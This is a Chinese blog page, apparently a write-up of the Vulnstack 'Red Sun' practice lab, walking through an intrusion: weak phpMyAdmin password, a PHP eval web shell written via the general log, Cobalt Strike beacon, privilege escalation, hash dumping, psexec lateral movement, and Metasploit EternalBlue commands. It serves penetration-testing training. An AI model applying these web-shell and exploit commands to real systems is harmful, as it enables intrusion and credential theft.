@@ -1,0 +1,595 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="F4tty" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      Vulnstack红日靶场1 
+      
+      
+      |
+    
+     F4tty
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/img/favicon.ico">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/img/avatar.jpg" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">F4tty</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">主页</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">归档</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">分类</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">标签</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">友链</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">关于我</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">Vulnstack红日靶场1</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2022-11-13 00:00:00
+        </span>
+        
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="分类"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" title="内网安全">
+                    <b>#</b> 内网安全
+                  </a>
+                </span>
+                
+              </span>
+          
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/%E5%86%85%E7%BD%91/" title="内网">
+                    #内网
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="Vulnstack红日靶场1"><a href="#Vulnstack红日靶场1" class="headerlink" title="Vulnstack红日靶场1"></a>Vulnstack红日靶场1</h1><h2 id="环境拓扑"><a href="#环境拓扑" class="headerlink" title="环境拓扑"></a>环境拓扑</h2><p><img src="/posts/4c0d44cb/ce7ddd3f-7c6b-4763-81dc-928d373c4210-11763069.jpg" alt="img"></p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>访问web是一个phpstudy探针</p>
+<p><img src="/posts/4c0d44cb/image-20221105090147000.png" alt="image-20221105090147000"></p>
+<p>可以找到web绝对路径<br>想到phpmyadmin访问:url&#x2F;phpmyadmin<br><img src="/posts/4c0d44cb/image-20221105090411063.png" alt="image-20221105090411063"><br>尝试弱口令root&#x2F;root<br>成功进入接下来就是利用phpadminGetshell了<br>先尝试select into outfile能不能写一句话</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="keyword">GLOBAL</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;%secure%</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/4c0d44cb/image-20221105091346248.png" alt="image-20221105091346248"><br>看来一句话不能利用<br>尝试利用日志写shell</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;%general%&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/4c0d44cb/image-20221105091527951.png" alt="image-20221105091527951"><br>得到日志文件位置<br>大概思路:开启general_log选项，把日志路径修改为网站根目录下的一个php文件下，然后把一句话写入日志达到getshell<br>开启general_log </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log = on;</span><br></pre></td></tr></table></figure>
+
+<p>修改日志路径(这里就利用到了前面获取的网站绝对路径)</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file<span class="operator">=</span><span class="string">&#x27;C:/phpStudy/WWW/shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/4c0d44cb/image-20221105092137875.png" alt="image-20221105092137875"><br>成功修改<br>写入一句话</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>连接shell<img src="/posts/4c0d44cb/image-20221105092353234.png" alt="image-20221105092353234"><br>发现还有一套cms<br><img src="/posts/4c0d44cb/image-20221105111916333.png" alt="image-20221105111916333"><br><img src="/posts/4c0d44cb/image-20221105111939679.png" alt="image-20221105111939679"><br>公告处直接给了后台入口和密码<br>后台存在SQL执行<br><img src="/posts/4c0d44cb/image-20221105122706041.png" alt="image-20221105122706041"><br>一样可以利用日志或者直接写一句话<br>经过测试利用日志写一句话可以成功<br><img src="/posts/4c0d44cb/image-20221105123434215.png" alt="image-20221105123434215"><br>发现模板文件可以编辑<br><img src="/posts/4c0d44cb/image-20221105123648290.png" alt="image-20221105123648290"><br>选择新增文件<br><img src="/posts/4c0d44cb/image-20221105123728834.png" alt="image-20221105123728834"><br>直接写入shell<br>回到刚才拿到的shell</p>
+<p><img src="/posts/4c0d44cb/image-20221105093235399.png" alt="image-20221105093235399"><br>权限为administrator<br>接下来传cs马,上线cs<br><img src="/posts/4c0d44cb/image-20221105094059576.png" alt="image-20221105094059576"><br><img src="/posts/4c0d44cb/image-20221105094112966.png" alt="image-20221105094112966"><img src="/posts/4c0d44cb/image-20221105093724875.png" alt="image-20221105093724875"><br>利用插件里的ms14-058提到system权限<br><img src="/posts/4c0d44cb/image-20221105094003106.png" alt="image-20221105094003106"><br><img src="/posts/4c0d44cb/image-20221105094010621.png" alt="image-20221105094010621"><br>接下来就是信息搜集了<br><img src="/posts/4c0d44cb/image-20221105094407408.png" alt="image-20221105094407408"><br>扫内网段<br><img src="/posts/4c0d44cb/image-20221105094427323.png" alt="image-20221105094427323"></p>
+<p><img src="/posts/4c0d44cb/image-20221105100024715.png" alt="image-20221105100024715"><br>继续抓Hash和密码<br><img src="/posts/4c0d44cb/image-20221105100535786.png" alt="image-20221105100535786"></p>
+<h2 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h2><h3 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h3><p>发现内网两台主机开启了445端口<br><img src="/posts/4c0d44cb/image-20221105102108390.png" alt="image-20221105102108390"><br><img src="/posts/4c0d44cb/image-20221105102119948.png" alt="image-20221105102119948"></p>
+<p>可以利用smb协议创建监听器然后利用psexec横向<br><img src="/posts/4c0d44cb/image-20221105110702067.png" alt="image-20221105110702067"><br><img src="/posts/4c0d44cb/image-20221105110717359.png" alt="image-20221105110717359"><br>利用刚在抓取到的明文密码<br><img src="/posts/4c0d44cb/image-20221105110822079.png" alt="image-20221105110822079"><br><img src="/posts/4c0d44cb/image-20221105111047041.png" alt="image-20221105111047041">域控和域成员都成功上线</p>
+<h3 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h3><p>除了利用smb协议横向外还可以利用445端口的ms17010<br>由于cs没有ms17-010的利用插件要联动msf将会话传到msf<br>CS建立监听器<br><img src="/posts/4c0d44cb/image-20221105102650000.png" alt="image-20221105102650000"><br>MSF监听联动配置</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 8888</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>CS执行</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spawn MSF #MSF为监听器名称,区分大小写</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/4c0d44cb/image-20221105103054944.png" alt="image-20221105103054944"><br>添加路由</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -p #查看当前路由表</span><br><span class="line">run post/multi/manage/autoroute #添加当前路由表</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/4c0d44cb/image-20221105103318047.png" alt="image-20221105103318047"><br>接下来该利用ms17-010了,先用<code>backgroud</code>将会话置于会话<br>ms17010检测模块</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line">set rhosts 192.168.52.137-144 #设置扫描目标段</span><br><span class="line">set threads 5 #设置扫描线程数</span><br><span class="line">run </span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/4c0d44cb/image-20221105103643340.png" alt="image-20221105103643340"><br>利用模块</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp #主机不出网使用正向连接上线</span><br><span class="line">set rhost 192.168.52.138 #设置连接目标</span><br><span class="line">set rhosts 192.168.52.138 #设置扫描目标</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>这里exp死活打不出来，换了exp也是执行成功但没有会话返回……放弃了</p>
+<p>参考:<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_52469895/article/details/124084745">https://blog.csdn.net/qq_52469895/article/details/124084745</a></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/posts/1e8c3e31/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2022-11-13 00:00:00
+            </span>
+            
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="分类"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" title="内网安全">
+                        <b>#</b> 内网安全
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/%E5%86%85%E7%BD%91/" title="内网">
+                        #内网
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/posts/a56ee1fe/" target="_self">
+                <span>下一页</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1"><span class="toc-text">Vulnstack红日靶场1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%8B%93%E6%89%91"><span class="toc-text">环境拓扑</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-text">Web</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91"><span class="toc-text">内网</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SMB"><span class="toc-text">SMB</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MS17-010"><span class="toc-text">MS17-010</span></a></li></ol></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2022 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1 + '&url=' + http%3A%2F%2Fexample.com%2Fposts%2F4c0d44cb%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/posts/4c0d44cb/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
